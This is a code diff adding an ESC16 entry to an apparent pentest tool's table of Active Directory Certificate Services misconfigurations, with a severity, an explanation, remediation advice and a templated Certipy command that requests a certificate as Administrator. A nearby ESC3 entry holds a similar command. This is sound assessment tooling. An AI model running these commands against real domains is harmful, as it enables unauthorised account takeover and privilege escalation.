@@ -77,6 +77,20 @@ _ESC = {
               "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>' "
               "-application-policies '1.3.6.1.4.1.311.20.2.1'  # Enrolment Agent -> ESC3",
               "Patch (Nov-2024); remove enrol rights on v1 templates."),
+    # ESC16: security-extension bypass via CA global disable. When
+    # CT_FLAG_NO_SECURITY_EXTENSION (0x00080000) is set on a CA globally (rather
+    # than per-template as ESC9 checks), EVERY certificate the CA issues omits
+    # the szOID_NTDS_CA_SECURITY_EXT SID extension - so weak-mapping account
+    # takeover (see ESC9/ESC10) is reachable through ANY enrollable template,
+    # not just the one with the flag. Certipy 5.x flags this on `certipy find`
+    # under the CA object as "ESC16"; recce inherits the label.
+    "ESC16": ("critical", "CA globally suppresses the SID security extension "
+              "(ESC16) - any issued cert can be mapped to an arbitrary account",
+              "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<ANY>' "
+              "-upn Administrator@<DOMAIN>  # then authenticate as the mapped account",
+              "Remove the CA-wide disable-extension flag; ensure StrongCertificate"
+              "BindingEnforcement is Full on every DC so weak account mappings "
+              "cannot be authenticated with regardless of the extension state."),
 }
 _DEFAULT = ("high", "ADCS misconfiguration flagged by Certipy",
             "certipy req -u <user>@<DOMAIN> -p <pass> -dc-ip <dc> -ca '<CA>' -template '<TEMPLATE>'",
